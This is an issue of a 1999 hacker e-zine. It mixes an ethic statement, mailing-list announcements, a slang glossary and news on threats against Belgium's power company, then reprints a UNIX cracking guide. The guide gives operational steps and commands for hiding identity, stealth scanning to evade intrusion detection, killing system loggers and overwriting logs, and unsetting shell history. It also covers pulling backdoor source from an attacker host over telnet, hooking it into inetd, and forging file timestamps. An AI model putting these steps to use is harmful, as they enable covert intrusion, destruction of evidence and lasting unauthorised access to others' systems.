     The Hacker's Ethic

     Sadly, due to the traditional ignorance and sensationalizing of the mass
     media, the once-noble term hacker has become a perjorative.
     
     Among true computer people, being called a hacker is a compliment. One of
     the traits of the true hacker is a profoundly antibureaucratic and
     democratic spirit. That spirit is best exemplified by the Hacker's Ethic.
     
     This ethic was best formulated by Steven Levy in his 1984 book Hackers:
     Heroes of the Computer Revolution. Its tenets are as follows:

      1 - Access to computers should be unlimited and total. 
      2 - All information should be free. 
      3 - Mistrust authority - promote decentralization. 
      4 - Hackers should be judged by their hacking not bogus criteria such as
          degrees, age, race, or position. 
      5 - You create art and beauty on a computer, 
      6 - Computers can change your life for the better. 

     The Internet as a whole reflects this ethic.

               A Comment on FORMATTING: 
   
   
               I received an email recently about the formatting of this
               newsletter, suggesting that it be formatted to 75 columns
               in the past I've endevoured to format all text to 80 cols
               except for articles and site statements and urls which are
               posted verbatim, I've decided to continue with this method
               unless more people complain, the zine is best viewed in
               1024x768 mode with UEDIT.... - Ed

   SYNOPSIS (READ THIS)
   --------------------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... &lt;g>

    Canada / North America (hell even if you are inside ..) and wish to
    send printed matter like newspaper clippings a subscription to your
    cool foreign hacking zine or photos, small non-explosive packages

    thanks.

	    BRAMPTON, ONTARIO
	    CANADA
	    L6V 4H5

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. &lt;g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.
    
    
    Stuff you can email:
    
    - Prank phone calls in .ram or .mp* format
    - Fone tones and security announcements from PBX's etc
    - fun shit you sampled off yer scanner (relevant stuff only like #2600 meeting activities)
    - reserved for one smiley face ->        :-)            <-
    - PHACV lists of files that you have or phac cd's you own (we have a burner, *g*)
    - burns of phac cds (email first to make sure we don't already have em)
    - Any and all telephone sounds/tones/beeps/trunk drops/line tests/etc in .ram etc format or .mp*
    

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it &lt;BeG>

    About the Bugtraq mailing list
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    The following comes from Bugtraq's info file:

    This list is for *detailed* discussion of UNIX security holes: what they are,
    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

    + Information on Unix related security holes/backdoors (past and present)
    + Exploit programs, scripts or detailed processes about the above
    + Patches, workarounds, fixes
    + Announcements, advisories or warnings
    + Ideas, future plans or current works dealing with Unix security
    + Information material regarding vendor contacts and procedures
    + Individual experiences in dealing with above vendors or security organizations
    + Incident advisories or informational reporting

    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not
    "CC" the bugtraq reflector address if the response does not meet the above criteria.

    Remember: YOYOW.

    You own your own words. This means that you are responsible for the words that you post on this list and that
    reproduction of those words without your permission in any medium outside the distribution of this list may be
     challenged by you, the author.

    UPDATED Sept/99 - Sent in by Androthi, tnx for the update
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    

      I am pleased to inform you of several changes that will be occurring
      on June 5th. I hope you find them as exciting as I do.
      
      
      BUGTRAQ moves to a new home
      ---------------------------
      
      
      First, BUGTRAQ will be moving from its current home at NETSPACE.ORG
      to SECURITYFOCUS.COM. What is Security Focus you ask? Wait and read
      below. Other than the change of domains nothing of how the list
      is run changes. I am still the moderator. We play by the same rules.
      
      
      Security Focus will be providing mail archives for BUGTRAQ. The
      archives go back longer than Netspace's and are more complete than
      Geek-Girl's.
      
      
      The move will occur one week from today. You will not need to
      resubscribe. All your information, including subscription options
      will be moved transparently.
      
      
      Any of you using mail filters (e.g. procmail) to sort incoming
      mail into mail folders by examining the From address will have to
      update them to include the new address. The new address will be:
      
      
                            BUGTRAQ@SECURITYFOCUS.COM
      
      
      Security Focus also be providing a free searchable vulnerability
      database.
      
      
      BUGTRAQ es muy bueno
      --------------------
      
      
      It has also become apparent that there is a need for forums
      in the spirit of BUGTRAQ where non-English speaking people
      or people that don't feel comfortable speaking English can
      exchange information.
      
      
      As such I've decided to give BUGTRAQ in other languages a try.
      BUGTRAQ will continue to be the place to submit vulnerability
      information, but if you feel more comfortable using some other
      language you can give the other lists a try. All relevant information
      from the other lists which have not already been covered here
      will be translated and forwarded on by the list moderator.
      
      
      In the next couple of weeks we will be introducing BUGTRAQ-JP
      (Japanese) which will be moderated by Nobuo Miwa &lt;n-miwa@lac.co.jp>
      and BUGTRAQ-SP (Spanish) which will be moderated by CORE SDI S.A.
      from Argentina &lt;http://www.core-sdi.com/> (the folks that brought you
      Secure Syslog and the SSH insertion attack).
      
      
      What is Security Focus?
      -----------------------
      
      
      Security Focus is an exercise in creating a community and a security
      resource. We hope to be able to provide a medium where useful and
      successful resources such as BUGTRAQ can occur, while at the same
      time providing a comprehensive source of security information. Aside
      from moving just BUGTRAQ over, the Geek-Girl archives (and the Geek Girl
      herself!) have moved over to Security Focus to help us with building
      this new community. The other staff at Security Focus are largely derived
      from long time supporters of Bugtraq and the community in general. If
      you are interested in viewing the staff pages, please see the 'About'
      section on www.securityfocus.com.
      
      
      On the community creating front you will find a set of forums
      and mailing lists we hope you will find useful. A number of them
      are not scheduled to start for several weeks but starting today
      the following list is available:
      
      
      * Incidents' Mailing List. BUGTRAQ has always been about the
         discussion of new vulnerabilities. As such I normally don't approve
         messages about break-ins, trojans, viruses, etc with the exception
         of wide spread cases (Melissa, ADM worm, etc). The other choice
         people are usually left with is email CERT but this fails to
         communicate this important information to other that may be
         potentially affected.
      
      
         The Incidents mailing list is a lightly moderated mailing list to
         facilitate the quick exchange of security incident information.
         Topical items include such things as information about rootkits
         new trojan horses and viruses, source of attacks and tell-tale
         signs of intrusions.
      
      
         To subscribe email LISTSERV@SECURITYFOCUS.COM with a message body
         of:
      
      
                   SUBS INCIDENTS FirstName, LastName
      
      
      Shortly we'll also be introducing an Information Warfare forum along
      with ten other forums over the next two months. These forums will be
      built and moderated by people in the community as well as vendors who
      are willing to take part in the community building process.
      *Note to the vendors here* We have several security vendors who have
      agreed to run forums where they can participate in the online communities.
      If you would like to take part as well, mail Alfred Huger,
      ahuger@securityfocus.com.
      
      
      On the information resource front you find a large database of
      the following:
      
      
      * Vulnerabilities. We are making accessible a free vulnerability
         database. You can search it by vendor, product and keyword. You
         will find detailed information on the vulnerability and how to fix it,
         as well are links to reference information such as email messages,
         advisories and web pages. You can search by vendor, product and
         keywords. The database itself is the result of culling through 5
         years of BUGTRAQ plus countless other lists and news groups. It's
         a shining example of how thorough full disclosure has made a significant
         impact on the industry over the last half decade.
      
      
      * Products. An incredible number of categorized security products
         from over two hundred different vendors.
      
      
      * Services. A large and focused directory of security services offered by
         vendors.
      
      
      * Books, Papers and Articles. A vast number of categorized security
         related books, papers and articles. Available to download directly
         for our servers when possible.
      
      
      * Tools. A large array of free security tools. Categorized and
         available for download.
      
      
      * News: A vast number of security news articles going all the way
         back to 1995.
      
      
      * Security Resources: A directory to other security resources on
         the net.
      
      
      As well as many other things such as an event calendar.
      
      
      For your convenience the home-page can be personalized to display
      only information you may be interested in. You can filter by
      categories, keywords and operating systems, as well as configure
      how much data to display.
      
      
      I'd like to thank the fine folks at NETSPACE for hosting the
      site for as long as they have. Their services have been invaluable.
      
      
      I hope you find these changes for the best and the new services
      useful. I invite you to visit http://www.securityfocus.com/ and
      check it out for yourself. If you have any comments or suggestions
      please feel free to contact me at this address or at
      aleph1@securityfocus.com.
      
      
      Cheers.

    [ISN] Security list

      --[ New ISN announcement (New!!)
      
      
      Sender:       ISN Mailing List &lt;ISN@SECURITYFOCUS.COM>
      From:         mea culpa &lt;jericho@DIMENSIONAL.COM>
      Subject:      Where has ISN been?
      Comments: To: InfoSec News &lt;isn@securityfocus.com>
      To:           ISN@SECURITYFOCUS.COM
      
      
      It all starts long ago, on a network far away..
      
      
      Not really. Several months ago the system that hosted the ISN mail list
      was taken offline. Before that occured, I was not able to retrieve the
      subscriber list. Because of that, the list has been down for a while. I
      opted to wait to get the list back rather than attempt to make everyone
      resubscribe.
      
      
      As you can see from the headers, ISN is now generously being hosted by
      Security Focus [www.securityfocus.com]. THey are providing the bandwidth,
      machine, and listserv that runs the list now.
      
      
      Hopefully, this message will find all ISN subscribers, help us weed out
      dead addresses, and assure you the list is still here. If you have found
      the list to be valuable in the past, please tell friends and associates
      about the list. To subscribe, mail listserv@securityfocus.com with
      "subscribe isn firstname lastname". To unsubscribe, "unsubscribe isn".
      
      
      As usual, comments and suggestions are welcome. I apologize for the down
      time of the list. Hopefully it won't happen again. ;)

      InfoSec News is a privately run, medium traffic list that caters 
      to distribution of information security news articles. These 
      articles will come from newspapers, magazines, online resources, 
      and more.
      
      
      The subject line will always contain the title of the article, so that
      you may quickly and effeciently filter past the articles of no interest.
      
      
      This list will contain:
      
      
      o       Articles catering to security, hacking, firewalls, new security
              encryption, products, public hacks, hoaxes, legislation affecting
              these topics and more.
      
      
      o       Information on where to obtain articles in current magazines.
      
      
      o       Security Book reviews and information.
      
      
      o       Security conference/seminar information.
      
      
      o       New security product information.
      
      
      o       And anything else that comes to mind..
      
      
      Feedback is encouraged. The list maintainers would like to hear what
      you think of the list, what could use improving, and which parts
      are "right on". Subscribers are also encouraged to submit articles
      or URLs. If you submit an article, please send either the URL or
      the article in ASCII text. Further, subscribers are encouraged to give
      feedback on articles or stories, which may be posted to the list.
      
      
      Please do NOT:
      
      
              * subscribe vanity mail forwards to this list
      
      
              * subscribe from 'free' mail addresses (ie: juno, hotmail)
      
      
              * enable vacation messages while subscribed to mail lists
      
      
              * subscribe from any account with a small quota
      
      
      All of these generate messages to the list owner and make tracking
      down dead accounts very difficult. I am currently receiving as many 
      as fifty returned mails a day. Any of the above are grounds for
      being unsubscribed. You are welcome to resubscribe when you address
      the issue(s).

      Well what does HWA stand for? never mind if you ever find out I may
     have to get those hax0rs from 'Hackers' or the Pretorians after you.

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' &lt;see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you
     up  and comers, i'd highly recommend you get that book. Its almost
     like  buying a clue. Anyway..on with the show .. - Editorial staff

00.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated again)
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

   *CON    - Conference, a place hackers crackers and hax0rs among others go to swap
             ideas, get drunk, swap new mad inphoz, get drunk, swap gear, get drunk
             watch videos and seminars, get drunk, listen to speakers, and last but
             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

    Ebonics - speaking like a rastafarian or hip dude of colour &lt;sic> also wigger
              Vanilla Ice is a wigger, The Beastie Boys and rappers speak using
              ebonics, speaking in a dark tongue ... being ereet, see pheer

            HNN affiliates ;)

    du0d   - a small furry animal that scurries over keyboards causing people to type
             weird crap on irc, hence when someone says something stupid or off topic
             'du0d wtf are you talkin about' may be used.

   *HACKER - Read Stephen Levy's HACKERS for the true definition, then see HAX0R

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala
            movies such as well erhm "Hackers" and The Net etc... usually used by "real"
            hackers or crackers in a derogatory or slang humorous way, like 'hax0r me
            some coffee?' or can you hax0r some bread on the way to the table please?'

            2 - A tool for cutting sheet metal.

    HHN    - Maybe a bit confusing with HNN but we did spring to life around the same
             time too, HWA Hax0r News.... HHN is a part of HNN .. and HNN as a proper

03.0  The Real ReDATtAck poised to Attack Belgium?
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Contributed by Zym0t1c,
      
      September, 28th 99 - A hacker who claims to be the real Redattack plans to
      shut down all the electricity in Belgium for about three hours tomorrow
      (29th).  It'll take place from 1.30pm till 4.30pm.  It'll last three hours
      because the generators of hospitals and the airport of Belgium can provide
      electricity for four hours and he doesn't want anyone getting killed.
      He claims to have hacked Electrabel (Belgian elektricity provider) and
      Belgacom (the biggest telephone company of Belgium (remember also ISP
      Skynet?))  He will also release some secret phone numbers of Belgacom
      clients and Proximus (cellular phone section of Belgacom) on the Internet
      (however no site was mentioned).
      
      Since the original ReDaTtAcK was more a mediawhore than a hacker (considered
      by the hacking ethic), this new Redattack took his name, so he claims...
      And if the government still doesn't take actions against crimes (?!!??) like
      these, he will shut down the whole country next week. We'll see...
      Is this a game of 'who's the best Belgian hacker?'  I hope not, because real
      hackers sometimes suffer because of these (sorry) idiots.
      
      Also today - The original ReDaTtAcK claims to have hacked Planet Internet,
      also one of the biggest ISP's of Belgium.  He could see some encrypted
      VISA-numbers and some client information.  Planet Internet has increased
      their security.  They press no charges against him.  ReDaTtAcK also claims
      to have found an underground childporn network of a school in Belgium.  He
      gave the information to the police of Gent, but they say his information was
      incomplete and maybe incorrect.
      
      
      Update
      ~~~~~~~           
       
      The original ReDaTtAcK wil be RA1
      The second, so called 'real' Redattack will be RA2, okay? :)
       
      Sept, 29th 1999 - Belgium
      First of all, yesterday I wrote that RA1 claimed to have found an underground
      child porn network...  Well, nothing of that is true, so say the authoroties.  RA1 
      just acted as a little girl on a chatroom and drow the attention of a man.  The man
      wanted to settle a little appointement between the two of them...  Therefore, RA1 
      gave the information to the authoroties assuming he had found a network.  The police 
      says RA1 exaggerated, although there might follow an investigation...
       
      Second, RA2 mailed our newspapers yesterday saying he was impressed by the added 
      security of Electrabel (Belgian electricity provider).  He will not shut down the 
      electricity but he will just try to break into the system  and leave a logo or 
      something.  The IT-staff of Electrabel is rather relax about it.  They claim their
      security system is unique, because they invented it, and it uses a system that 
      practically no-one knows how to use, except the IT-staff of Electrabel of course. 
      So, if he hacks the system, he first needs to learn using the system before he can
      actually do something... They are interested in the vulnerabilities of their system
      and hope that if RA2 succeeds, he will explain the holes found in their system.
      
           
      /** 
      I've also heard of a few people that RA1 has offered his services to Electrabel to
      secure their system.  I haven't read it  or heard it on the radio, it's just what 
      I've heard (maybe rumours), so I cannot prove it. Are they really playing a game of
      who's the best or who gets the most media attention?  
      **/
      
      The newspaper wrote also that they think RA2 was exaggerating about his skills. 
      Two days ago he was so sure about hacking this computer and see what happens now:
      he pulls back.  "When I cannot hack the system, I will make positive publicity about
      their security system.", says RA2.  Jeezes man! :))
       
      Third, Belgacom (biggest Belgian phone service provider) is pressing a charge against
      RA2.  He claimed to kill all phonelines in Belgium and to publish secret phone and GSM
      numbers on the Internet.  Well, there actually was a list with some phone numbers on the
      Internet, so people thought he really hacked Belgacom's system and copied the list. 
      Guess what???  He published some phone and GSM numbers from Advalvas.com.  The numbers 
      were from people who registered for an emailadres and left their phone and GSM numbers...  :)
      Because of the fact that RA2 threatened with criminal facts like killing the phone lines 
      and publishing secret numbers, Belgacom pressed a charge against unknown people (referring 
      to RA2, although they just know he's 22 and he's an IT'er).
      Since there has been a charge against him, the police could trace him.
      We'll see...
       
      I also added the newspaper article of the same newspaper 'De Standaard' and it's again in
       dutch!  Sorry for this! :)))

      HNN's Coverage; Belgium Electric Company Threatened by Cyber Intruder 


      contributed by Maxim.Glory 
      Belgian electricity provider Electrabel has been
      threatened by an an unknown assailant. The cyber
      intruder has threatened to turn off all power in the
      country sometime between 1:30 and 3:30 pm CET on
      Wednesday. According to an Electrabel spokesperson
      the system controlling Electrabel's distribution of power
      is custom made and the connections are therefore extra
      protected. (Oh yeah, security through obscurity, that
      always works.)

      Minutes after we went to press HNN learned that the
      attacker who goes by the name ReDaTtAcK 2, has
      withdrawn his threat and now says that he will not be
      turning off the power. (Of course now people will
      wonder if he ever could have and this person who did
      nothing more than make a phone call will forever be
      labeled as a 'hacker'. Thanks.)

      BRUSSELS (Reuters) - A computer hacker has threatened to break into the computers of Belgian electricity generator Electrabel
      Wednesday afternoon and halt the power supply to the entire country.
    
      "Tomorrow I will leave Belgium without power, and that is not so difficult," the anonymous hacker told the Belgian newspaper Het
      Laatste Nieuws.
    
      "Wednesday I will get into Electrabel's computers between 1:30 and 3:30 in the afternoon and shut down all the electricity," the
      hacker said.
    
      Electrabel, which has a virtual monopoly on Belgium's electricity market, said it was taking the threat seriously but felt that the
      hacker had little chance of succeeding.
    
      "There is very little chance that Belgium could be without power," Electrabel spokesman Phillipe Massart told RTBF television.
      "Nonetheless, the risk that someone could access the system always exists."
    
      Massart said the systems that pilot Electrabel's power distribution were developed specifically for the company and have protected
      connections. He said the company was taking measures to ensure its security.

      BRUSSELS (Reuters) - A computer hacker has backed down from a threat to break into the computers of Belgian electricity
      generator Electrabel Wednesday afternoon and cut the nation's power supply, Electrabel said.
    
      The hacker, who calls himself ReDaTtAcK 2, phoned Electrabel, which has a virtual monopoly on Belgium's electricity market, to
      withdraw the threat.
    
      "I had this guy on the phone," spokesman Patrick De Vos told Reuters. "He withdrew his threat. It's a non-event."
    
      The hacker launched a crusade earlier in the summer, attacking Web sites in an attempt to alert Belgium to the security risks of the
      Internet.
    
      De Vos said the hacker had threatened to break into Electrabel's computers to prove the system's vulnerability.
    
      "He would like to try and find a hole and insert his business card and say this is a failure in the system," De Vos said.
    
      He said the company had taken the threat seriously but did not believe its system had ever been at risk.

                                 (c) 1999 by Mixter
      
      
      Disclaimer:
       This is a theoretical instruction to cracking and for informational
       purposes. It should be seen as an introduction to the methods and
       strategies used by crackers rather than a howto. The author is not
       suggesting to perform illegal actions and cannot be held liable
       for any actions of other individuals who perform any of the actions
       discussed in this paper and possible resulting damage.
      
      Introduction:
       I am going to describe the methods and strategies used to access
       various UNIX hosts among the internet unauthorizedly. This guide will
       not teach you how to hack, neither do you have to be a hacker to use
       the techniques described here. Hacking means finding your own way
       to do it, and finding new approaches to accomplishing something. I am
       only going to supply you with one possible approach to cracking.
      
      I. Prerequisites
      
      Operating System:
       You certainly need Unix installed on your home computer. WINDOWS
       WILL NOT DO IT. I'm not going into details here, but you should take
       either Net/Open/FreeBSD or Linux because they are POSIX compliant,
       suitable for Home PC's and most small network tools will compile
       on them. If you use Linux [1], you should not use the RedHat, SuSE, or
       Slackware distributions unless you know how to secure them properly.
       Local root compromise can be fatal as you may reveal your identity.
      
      Basic Knowledge:
       Get experienced in the use with the following tools. Use the 'man' command,
       and work with them until you fully understand them. These tools are:
       awk    cat     chmod   dd      grep     gzip    kill    ln
       ls     mail    mknod   more    mount    ping    ps      sed
       sort   tar     ifconfig        ipfwadm  last    head    tail
       gcc    cut     find    ftp     less     vim     nc (netcat)
       rcp    xhost   xterm   syslogd inetd    telnet  ssh     finger
      
      Security requirements:
       You need to make sure that no one can compromise your own host. Check
       security sites to make sure your daemons (servers) are not exploitable.
       Do not allow anyone to use your box. Disable telnet, rlogin, and whatever
       you don't need yourself. Ideally, you do not run any servers at all while
       you are attacking other hosts. Consider encrypting directories and/or
       complete partitions with encrypted file systems and encrypt emails and
       files you transfer with PGP. [2]
      
      Account:
       For your activities, you require an ISP account with a direct connection,
       which normally all ISP provide. You might want to consider not doing
       any 'cracking' activities from your home at all, in which case you need
       a fast linux or bsd shell account, which must not be from a commercial
       shell provider (esp. those who sell eggdrop and irc accounts), and if
       you use a university account, you need to make sure that they do not
       watch / monitor their users. If you use a dialup, ensure yourself that
       no transparent proxies or network monitors (squid etc.) are being run by
       your provider. Do a traceroute and check your providers backbone routers
       for NIDS (Intrusion Detection), network monitors, proxies, and anything
       that seems unusual; alternatively let someone with more knowledge do it.
      
      II. Scanning
      
      Avoiding track-downs:
       Where you scan from is up yours. Whatever you do, don't scan from your
       dialup while using a legit internet account. Everyone knowing your IP is
       a phone call to your provider away from knowing your identity. If you
       use fake accounts, avoid using fake or stolen credit cards to make them.
       Also avoid using 1-800 numbers at all costs, because the 1-800 nodes
       generally log every calling phone number with access time. Inquire about
       the ISP you use to make sure he is not in explicit cooperation with federal
       agencies. Additionally, do not stay longer than 5 (in words: five) hours
       on the internet without hanging up and reconnecting. Why? If you are
       logged on, the node has your account associated with your current
       dynamic IP address for obvious technical reasons, and they also might
       be able to trace you. Most nodes will not keep a table of which IP
       belongs to which account once they disconnected, especially on huge
       ISP where this would take large additional resources.
       I disrecommend traversing through WinGate and SOCKS servers,
       because they give you a fake feeling of safety. Often, these servers are
       logging every access and sometimes they are put up by federal agencies
       itself. You should ideally relay your connections through a server you
       have root, hence full control, on, using datapipe, bnc, ssl, or a
       wingate/socks server with logging completely disabled.
      
      Stealthy scanning:
       A scan not being noticed is a successful scan. Half-Open (SYN)
       scans are lame, because many daemons will still report a
       "warning: can't get client address: Connection reset by peer"
       or similar message, then have someone turn on a sniffer or tcplogd
       and they see who is scanning them. Advanced and recommended scans
       are NUL (tcp packet without any flags), XMAS (ack/syn/rst probe),
       and Maimon scans, which can be done with nmap [3]. If you use
       connect() scans, which are much more reliable, then use lscan,
       and get the version info. This generally makes the most sense
       because you have to get the daemon's versions anyway to see
       if it is exploitable.
      
      Play dead:
       As you scan, I strongly recommend disabling every single service
       on the machine you're scanning from and setting packet filtering
       rules. This will fool the hosts being scanned into thinking your
       host is down and the scan is spoofed.
       A few things you should disable:
       * Inetd ( identd, finger, ftp, telnet )
       * All INCOMING tcp connection requests (ipfwadm: -y flag)
       * ICMP Timestamping, Echo reply, Query (ICMP types 8/13/15/17)
       * UDP Traceroute queries (udp port range 33400-33500)
       Also note that -deny is better than -reject, which would send
       an ICMP unreach packet back instead of keeping totally silent.
      
      Non-sequential scanning:
       This is important: Use non-sequential scanning to avoid
       intrusion detection systems. An IDS or NIDS is installed on a gateway
       or router and monitors unusual traffic to certain ports. If you scan
       1.1.1.1, 1.1.1.2 .. 1.1.1.255, 1.1.2.1 etc.,
       an intrusion detection system can detect your scan against 1.1.1.*.
       Instead, scan like this: 1.1.1.1, 1.1.2.1 .. 1.1.255.1, 1.1.1.2
       You get the point.
      
      What to scan:
       Most crackers resolve a top-level domain like .com .net or a
       country like .ee .se .ch etc. using z0ne or axfr from ADM [4], or
       by using a simple recursive shell script. host -l domain will
       not do for a scan, because you'll miss all the subnets that way,
       and there are plenty of them.
       However, I'd rather suggest scanning complete IP blocks. Depending
       on your greed, you can either scan a class B (1.1.*.*) or class A
       (1.*.*.*) network. You might wish to obtain some information about
       your targets first. To do this, you can query whois.arin.net, the
       registration center for IP addresses. Lets say you want to scan
       192.168.*.* and you want to know who owns that IP block. Type:
       whois -h whois.arin.net 192.168.0.0
       or
       whois 192.168.0.0@whois.arin.net
       and you get a short description of the owners of that netblock.
       If arin.net doesn't find any information, don't scan it, because
       the IPs are probably not yet in use. Some info on the 'whois'
       results...
       Maintained by RIPE.NET = European (no, uk, ch, at, de, se, dk, etc.)
       Maintained by APNIC.NET = Asian (id, kr, za, ee, tr, li, kh, etc.)
       Maintained by NIC.xxx = Belonging to country xxx
      
      Finding vulnerable hosts:
       First rule of scanning is: never delete your scan logs. If
       you think you are completely done with evaluating your logs,
       then compress, encrypt and store them, dont delete them. New
       security vulnerabilities will be found sooner or later, then you
       won't have to scan it all again.
       From my experience, the vulnerability scanners are almost all
       bullshit, you dont need them. Use grep and awk to extract the
       IP numbers from your scan logs, like this...
       grep "QPOP" port110.log | grep "(version 2.2)" | awk '{print $1}' > 0wn.txt
       (presuming that your scanner logs like this: "&lt;IP> - &lt;CAPTURED VERSION>")
       There are a couple of cases where you need an additional scan
       to find vulnerable versions, which are:
      
       Buggy Daemon           Scanner                 Scans for...
       wu-ftp BETA-18         wuftpscan/ben (private) Writable dir
       portmap                rpcinfo -p (unix tool)  Portmap Version
       ttdbserver             rpcinfo                 ttdb version
       rstatd                 statdscan               rstatd version
       mountd                 mountdscan (rootshell)  mountd/nfs version
       bind                   binfo-udp (rootshell),  bind version
                              nscan (my site),
                              mbind (private)
      
      III. Rooting
      
      Lets think about the first commands you issue. They should:
       1. Discretely remove traces of the root compromise
       2. Gather some general info about the system
       3. Make sure you can get back in
       4. Disable or patch the vulnerable daemon(s)
      
       Here are my suggestions...
      
       1. killall -9 syslogd klogd - pesky loggers! only few admins
          will notice if they get turned off. Now you can act freely.
          copy secure.1 and messages.1 from /var/log over secure and messages
          Normally, these logs are the only ones with the intruders IP
          and traces of a root compromise in them. If *.1 doesn't exist,
          truncate the files. Also, unset HISTFILE is important.
          Nobody does unset HISTFILE, thus leaving a .bash_history in
          /var/named or even /. Very unprofessional :).
      
       2. uname -a, w, last -10, cat /etc/passwd /etc/inetd.conf...
          Inform yourself about the frequency the system is being
          maintained, administrated, if the logfiles are being analyzed.
          * Look how many people have access to it (/etc/passwd) - the
          more the better for you (keeps attention away from you).
          * Look if the system is already backdoored!! you might want to
          remove other backdoors.
          * Look for a loghost or snmp (dangerous because you cant manipulate
          the logs on a far-away loghost). Watch out for *logd, sniffers,
          netmon's etc before you do anything great on the host.
          If you are paranoid, traceroute the host, and see if non-routers
          are before that host (probably IDS, loghost, sniffer, etc).
      
       3. This is important: DONT MANIPULATE THE SYSTEM CONFIGURATION! DOH!
          It is too easy to detect you if you add yourself to /etc/passwd,
          or open a port by manipulating inetd.conf. Let me tell you that
          root kits and /bin/login trojans are the first things any sane admin
          will watch for. Install a nice stealthy port backdoor. My approach
          to uploading files is doing:
          (on your box)
           $ uuencode -m backdoor.c backdoor.c | less
           &lt;uu encoded junk appears, which you copy with your mouse>
          (on the target box)
           uudecode
           &lt;it waits for input, paste the uuencoded stuff, page-by-page>
           # cc -o backdoor backdoor.c
         A nice different method is putting a daemon on your own box, on
         port 666, that spits out the source code when someone telnets to
         it, so you can do telnet ppp-42.haxor.net 666 > backdoor.c
         As I said, make sure you can get back in. If the box you rooted
         has an uptime of more than 300 days or so, you might consider
         not installing the backdoor for startup. Instead, kill the
         vulnerable daemon, and when the host restarts, come back using an
         exploit. Normally, you can replace a lame daemon that nobody uses
         with your backdoor. Look at inetd.conf to see what daemons are
         active. A safe bet is in.talkd which often is activated but seldom
         ever used. So, when you want to re-activate your backdoor,
         talk root@0wned.host.com for a second, and your backdoor is running.
         You can also add /path/to/backdoor to /root/.profile.. but it is
         a bit riskier than the inetd backdoor method.
      
       4. Subscribe to bugtraq, CIAC security list, or look at rootshell,
          to see what you need to do to patch your buggy stuff. If RPM is
          installed you can try a rpm -U ftp://ftp.cdrom.com/rightdir/daemon.rpm
          If not, use ncftp to fetch the file anonymously, because it doesn't need
          user interaction. If you want, add an additional backdoor in your
          "patched" server. QPOP 2.53 even supports this itself.
          For all files you replace, you should modify the time stamps,
          which wont help, if the admin uses tripwire or cksum, but if the
          admin is, like most admins, a complete lamer that does find / -ctime
          to scan for trojans and thinks he knows his job. :P
          To modify timestamps, you do a simple:
          touch -r /bin/bash /path/to/your/trojan
          this will copy the exact date/time info from /bin/bash
          over your freshly added trojan. Voila!
